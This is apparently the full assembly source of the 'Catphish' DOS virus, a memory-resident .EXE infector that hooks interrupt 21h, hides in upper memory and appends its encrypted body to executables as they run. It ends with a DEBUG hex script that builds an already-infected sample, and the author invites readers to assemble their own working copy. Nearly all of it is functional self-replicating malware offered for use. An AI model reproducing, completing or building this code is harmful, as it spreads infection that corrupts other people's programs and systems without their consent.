
name    VIRUSTEST
        title   
code    segment  
        assume  cs:code, ds:code, es:code
        org     100h

;-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
;                       FirstStrike presents:
;
;                        The Catphish Virus.    
;
;   The Catphish virus is a resident .EXE infector.
;                Size: 678 bytes (decimal).
;                No activation (bomb).
;                Saves date and file attributes.
;
;         If assembling, check_if_resident jump must be marked over
;           with nop after first execution (first execution will hang
;           system).
;
;         *** Source is made available to learn from, not to
;               change author's name and claim credit! ***

start:
        call    setup                             ; Find "delta offset".
setup:               
        pop     bp                              
        sub     bp, offset setup-100h
        jmp     check_if_resident                 ; See note above about jmp!

pre_dec_em:
        mov bx,offset infect_header-100h
        add bx,bp
        mov cx,endcrypt-infect_header

ror_em:
        mov dl,byte ptr cs:[bx]
        ror dl,1                                  ; Decrypt virus code
        mov byte ptr cs:[bx],dl                   ;   by rotating right.
        inc bx                                    
        loop ror_em

        jmp check_if_resident

;--------------------------------- Infect .EXE header -----------------------
;   The .EXE header modifying code below is my reworked version of 
;     Dark Angel's code found in his Phalcon/Skism virus guides.


infect_header:
          push bx
          push dx
          push ax



          mov     bx, word ptr [buffer+8-100h]    ; Header size in paragraphs
               ;  ^---make sure you don't destroy the file handle
          mov     cl, 4                           ; Multiply by 16.  Won't
          shl     bx, cl                          ; work with headers > 4096
                                                  ; bytes.  Oh well!
          sub     ax, bx                          ; Subtract header size from
          sbb     dx, 0                           ; file size
    ; Now DX:AX is loaded with file size minus header size
          mov     cx, 10h                         ; DX:AX/CX = AX Remainder DX
          div     cx
  
  
          mov     word ptr [buffer+14h-100h], dx  ; IP Offset
          mov     word ptr [buffer+16h-100h], ax  ; CS Displacement in module
  
  
          mov     word ptr [buffer+0Eh-100h], ax     ; Paragraph disp. SS
          mov     word ptr [buffer+10h-100h], 0A000h ; Starting SP
  
          pop ax
          pop dx

          add ax, endcode-start                   ; add virus size
          cmp ax, endcode-start
          jb fix_fault
          jmp execont


war_cry  db 'Cry Havoc, and let slip the Dogs of War!',0
v_name   db '[Catphish]',0                        ; Virus name.
v_author db 'FirstStrike',0                       ; Me.
v_stuff  db 'Kraft!',0


fix_fault:
          add dx,1d
  
execont:
          push ax      
          mov cl, 9    
          shr ax, cl   
          ror dx, cl   
          stc          
                       
          adc dx, ax   
          pop ax       
          and ah, 1    
          
  
          mov word ptr [buffer+4-100h], dx        ; Fix-up the file size in
          mov word ptr [buffer+2-100h], ax        ; the EXE header.
     
          pop bx
          retn                                    ; Leave subroutine

;----------------------------------------------------------------------------


check_if_resident:
        push es
        xor ax,ax 
        mov es,ax

        cmp word ptr es:[63h*4],0040h             ; Check to see if virus
        jnz grab_da_vectors                       ;   is already resident
        jmp exit_normal                           ;   by looking for a 40h
                                                  ;   signature in the int 63h
                                                  ;   offset section of 
                                                  ;   interrupt table.

grab_da_vectors:

        mov ax,3521h                              ; Store original int 21h
        int 21h                                   ;   vector pointer.
        mov word ptr cs:[bp+dos_vector-100h],bx
        mov word ptr cs:[bp+dos_vector+2-100h],es



load_high:
        push ds

find_chain:                                       ; Load high routine that
                                                  ;   uses the DOS internal
     mov ah,52h                                   ;   table function to find
     int 21h                                      ;   start of MCB and then
                                                  ;   scales up chain to
     mov ds,es: word ptr [bx-2]                   ;   find top. (The code
     assume ds:nothing                            ;   is long, but it is the 
                                                  ;   only code that would
     xor si,si                                    ;   work when an infected
                                                  ;   .EXE was to be loaded 
Middle_check:                                     ;   into memory.
     
     cmp byte ptr ds:[0],'M'
     jne Check4last

add_one:
     mov ax,ds
     add ax,ds:[3]
     inc ax

     mov ds,ax
     jmp Middle_check

Check4last:
     cmp byte ptr ds:[0],'Z'
     jne Error
     mov byte ptr ds:[0],'M'
     sub word ptr ds:[3],(endcode-start+15h)/16h+1
     jmp add_one

error:
     mov byte ptr ds:[0],'Z'
     mov word ptr ds:[1],008h
     mov word ptr ds:[3],(endcode-start+15h)/16h+1

     push ds
     pop ax
     inc ax
     push ax
     pop es





move_virus_loop:
        mov bx,offset start-100h                  ; Move virus into carved
        add bx,bp                                 ;   out location in memory.
        mov cx,endcode-start
        push bp
        mov bp,0000h

move_it:
        mov dl, byte ptr cs:[bx]
        mov byte ptr es:[bp],dl
        inc bp
        inc bx
        loop move_it
        pop bp



hook_vectors:

        mov ax,2563h                              ; Hook the int 21h vector
        mov dx,0040h                              ;   which means it will
        int 21h                                   ;   point to virus code in
                                                  ;   memory.
        mov ax,2521h
        mov dx,offset virus_attack-100h
        push es
        pop ds
        int 21h




        pop ds



exit_normal:                                      ; Return control to 
        pop es                                    ;   infected .EXE
        mov ax, es                                ;   (Dark Angle code.)
        add ax, 10h 
        add word ptr cs:[bp+OrigCSIP+2-100h], ax 
                                         
        cli
        add ax, word ptr cs:[bp+OrigSSSP+2-100h] 
        mov ss, ax
        mov sp, word ptr cs:[bp+OrigSSSP-100h]
        sti

        xor ax,ax
        xor bp,bp

endcrypt  label  byte        

        db 0eah                          
OrigCSIP dd 0fff00000h
OrigSSSP dd ?                    

exe_attrib dw ?
date_stamp dw ?
time_stamp dw ?



dos_vector dd ?                                   

buffer db 18h dup(?)                              ; .EXE header buffer.




;----------------------------------------------------------------------------


virus_attack proc  far
               assume cs:code,ds:nothing, es:nothing

        
        cmp ax,4b00h                              ; Infect only on file
        jz run_kill                               ;   executions.

leave_virus:
        jmp dword ptr cs:[dos_vector-100h]                                



run_kill:
        call infectexe
        jmp leave_virus





infectexe:                                        ; Same old working horse
        push ax                                   ;   routine that infects
        push bx                                   ;   the selected file.
        push cx
        push es
        push dx
        push ds
 
        

        mov cx,64d
        mov bx,dx

findname:
        cmp byte ptr ds:[bx],'.'
        jz o_k
        inc bx
        loop findname

pre_get_out:
        jmp get_out

o_k:
        cmp byte ptr ds:[bx+1],'E'                ; Searches for victims.
        jnz pre_get_out
        cmp byte ptr ds:[bx+2],'X'
        jnz pre_get_out
        cmp byte ptr ds:[bx+3],'E'
        jnz pre_get_out
       



getexe:
        mov ax,4300h
        call dosit

        mov word ptr cs:[exe_attrib-100h],cx

        mov ax,4301h
        xor cx,cx
        call dosit

exe_kill:
        mov ax,3d02h
        call dosit
        xchg bx,ax
        
        mov ax,5700h
        call dosit

        mov word ptr cs:[time_stamp-100h],cx
        mov word ptr cs:[date_stamp-100h],dx



        push cs
        pop ds

        mov ah,3fh
        mov cx,18h
        mov dx,offset buffer-100h
        call dosit

        cmp word ptr cs:[buffer+12h-100h],1993h   ; Looks for virus marker
        jnz infectforsure                         ;   of 1993h in .EXE 
        jmp close_it                              ;   header checksum 
                                                  ;   position.
infectforsure:
        call move_f_ptrfar

        push ax
        push dx


        call store_header

        pop dx
        pop ax

        call infect_header


        push bx
        push cx
        push dx
        

        mov bx,offset infect_header-100h
        mov cx,(endcrypt)-(infect_header)

rol_em:                                           ; Encryption via 
        mov dl,byte ptr cs:[bx]                   ;   rotating left.
        rol dl,1                                    
        mov byte ptr cs:[bx],dl
        inc bx
        loop rol_em

        pop dx
        pop cx
        pop bx

        mov ah,40h
        mov cx,endcode-start
        mov dx,offset start-100h
        call dosit


        mov word ptr cs:[buffer+12h-100h],1993h


        call move_f_ptrclose

        mov ah,40h
        mov cx,18h
        mov dx,offset buffer-100h
        call dosit

        mov ax,5701h
        mov cx,word ptr cs:[time_stamp-100h]
        mov dx,word ptr cs:[date_stamp-100h]
        call dosit

close_it:


        mov ah,3eh
        call dosit

get_out:


        pop ds
        pop dx

set_attrib:
        mov ax,4301h
        mov cx,word ptr cs:[exe_attrib-100h]
        call dosit


        pop es
        pop cx
        pop bx
        pop ax

        retn
        
;---------------------------------- Call to DOS int 21h ---------------------

dosit:                                            ; DOS function call code.
        pushf
        call dword ptr cs:[dos_vector-100h]
        retn

;----------------------------------------------------------------------------
                                                                            









;-------------------------------- Store Header -----------------------------
 
store_header:
        les  ax, dword ptr [buffer+14h-100h]      ; Save old entry point
        mov  word ptr [OrigCSIP-100h], ax
        mov  word ptr [OrigCSIP+2-100h], es
  
        les  ax, dword ptr [buffer+0Eh-100h]      ; Save old stack
        mov  word ptr [OrigSSSP-100h], es
        mov  word ptr [OrigSSSP+2-100h], ax

        retn

;---------------------------------------------------------------------------






;---------------------------------- Set file pointer ------------------------

move_f_ptrfar:                                    ; Code to move file pointer.
        mov ax,4202h
        jmp short move_f

move_f_ptrclose:
        mov ax,4200h

move_f:
        xor dx,dx
        xor cx,cx
        call dosit
        retn

;----------------------------------------------------------------------------


endcode         label       byte

endp

code ends
end  start   


>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

              Below is a sample file that is already infected.
            Just cut out code and run through debug. Next rename 
            DUMMY.FIL to DUMMY.EXE and you have a working copy of
            your very own Catphish virus.


N DUMMY.FIL
E 0100 4D 5A 93 00 06 00 00 00 20 00 00 00 FF FF 5E 00 
E 0110 00 A0 93 19 0D 00 5E 00 3E 00 00 00 01 00 FB 30 
E 0120 6A 72 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0160 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 01A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 01B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 01C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 01D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 01E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 01F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 02A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 02B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 02C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 02D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 02F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0300 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0310 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0320 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0330 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0340 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0350 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0360 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0370 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 03A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 03B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 03C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 03D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 03E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 03F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0440 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0450 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 04A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 04B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 04C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 04D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 04E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 04F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0500 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0510 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0520 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0530 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0540 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0550 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0560 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0570 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0580 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0590 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 05A0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 05B0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 05C0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 05D0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 05E0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 05F0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0600 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0610 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0620 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0630 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0640 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0650 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0660 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0670 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0680 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0690 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 06A0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 06B0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 06C0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 06D0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 06E0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 06F0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0700 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0710 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0720 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0730 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0740 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0750 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0760 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0770 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0780 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0790 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 07A0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 07B0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 07C0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 07D0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 07E0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 07F0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0800 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0810 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0820 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0830 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0840 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0850 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0860 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0870 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0880 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 0890 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 08A0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 08B0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 08C0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 08D0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
E 08E0 90 90 90 90 90 90 90 90 B8 00 4C CD 21 E8 00 00 
E 08F0 5D 81 ED 03 00 90 90 90 BB 21 00 03 DD B9 41 01 
E 0900 2E 8A 17 D0 CA 2E 88 17 43 E2 F5 E9 93 00 A6 A4 
E 0910 A0 17 3C FA 02 63 08 A7 C7 56 87 07 B5 00 73 20 
E 0920 00 EF E3 13 2C 13 02 47 17 02 47 07 02 8F 0C 0B 
E 0930 02 00 41 B0 B4 0A 4D 04 7A 4D 04 E4 94 D7 96 21 
E 0940 86 E4 F2 40 90 C2 EC DE C6 58 40 C2 DC C8 40 D8 
E 0950 CA E8 40 E6 D8 D2 E0 40 E8 D0 CA 40 88 DE CE E6 
E 0960 40 DE CC 40 AE C2 E4 42 00 B6 86 C2 E8 E0 D0 D2 
E 0970 E6 D0 BA 00 8C D2 E4 E6 E8 A6 E8 E4 D2 D6 CA 00 
E 0980 96 E4 C2 CC E8 42 00 07 85 02 A0 63 12 A7 D1 A7 
E 0990 95 F3 26 A1 B0 01 C9 02 13 2C F2 02 47 EE 02 B6 
E 09A0 87 0C 66 81 1D 81 4C 07 7C 19 02 80 EA 06 D3 03 
E 09B0 00 71 42 6A 9B 42 5C 13 3D E2 02 5C 19 0D E6 02 
E 09C0 3C 69 A4 9B 42 4C 1D BE FD 66 ED 01 7C 00 00 9A 
E 09D0 EA 16 19 B1 06 0C 06 00 80 1D B1 D7 DD 01 7C 00 
E 09E0 00 B4 EA 1A 8D 0C 00 00 9A 07 5C 06 00 40 21 D7 
E 09F0 C3 8D 0C 00 00 B4 8F 0C 02 00 10 00 8F 0C 06 00 
E 0A00 40 00 3C B0 80 A0 0E 77 00 00 06 BB 73 4D 04 AA 
E 0A10 7B 00 00 5C 15 2E 4C 11 AC 00 8A 86 C5 EB BA 71 
E 0A20 C6 4A 75 80 00 9B 42 71 42 4A 75 1B 02 0C 3E 9B 
E 0A30 42 3E 0E 19 81 0A 20 00 5C 02 0D CA 02 F5 5C 06 
E 0A40 0D D2 02 1D A1 5C 17 4D CE 02 F7 66 81 66 DB EA 
E 0A50 00 01 10 00 00 01 00 00 20 00 97 19 5A 0B 92 14 
E 0A60 1D 07 4D 5A 93 00 06 00 00 00 20 00 00 00 FF FF 
E 0A70 5E 00 00 A0 00 00 0D 00 5E 00 3D 00 4B 74 05 2E 
E 0A80 FF 2E 71 01 E8 02 00 EB F6 50 53 51 06 52 1E B9 
E 0A90 40 00 8B DA 80 3F 2E 74 06 43 E2 F8 E9 AE 00 80 
E 0AA0 7F 01 45 75 F7 80 7F 02 58 75 F1 80 7F 03 45 75 
E 0AB0 EB B8 00 43 E8 A8 00 2E 89 0E 6B 01 B8 01 43 33 
E 0AC0 C9 E8 9B 00 B8 02 3D E8 95 00 93 B8 00 57 E8 8E 
E 0AD0 00 2E 89 0E 6F 01 2E 89 16 6D 01 0E 1F B4 3F B9 
E 0AE0 18 00 BA 75 01 E8 77 00 2E 81 3E 87 01 93 19 75 
E 0AF0 03 EB 55 90 E8 8C 00 50 52 E8 6A 00 5A 58 E8 0D 
E 0B00 FE 53 51 52 BB 21 00 B9 41 01 2E 8A 17 D0 C2 2E 
E 0B10 88 17 43 E2 F5 5A 59 5B B4 40 B9 A6 02 BA 00 00 
E 0B20 E8 3C 00 2E C7 06 87 01 93 19 E8 5B 00 B4 40 B9 
E 0B30 18 00 BA 75 01 E8 27 00 B8 01 57 2E 8B 0E 6F 01 
E 0B40 2E 8B 16 6D 01 E8 17 00 B4 3E E8 12 00 1F 5A B8 
E 0B50 01 43 2E 8B 0E 6B 01 E8 05 00 07 59 5B 58 C3 9C 
E 0B60 2E FF 1E 71 01 C3 2E C4 06 89 01 2E A3 63 01 2E 
E 0B70 8C 06 65 01 2E C4 06 83 01 2E 8C 06 67 01 2E A3 
E 0B80 69 01 C3 B8 02 42 EB 03 B8 00 42 33 D2 33 C9 E8 
E 0B90 CD FF C3 
RCX
0A93
W
Q


                             -+- FirstStrike -+-
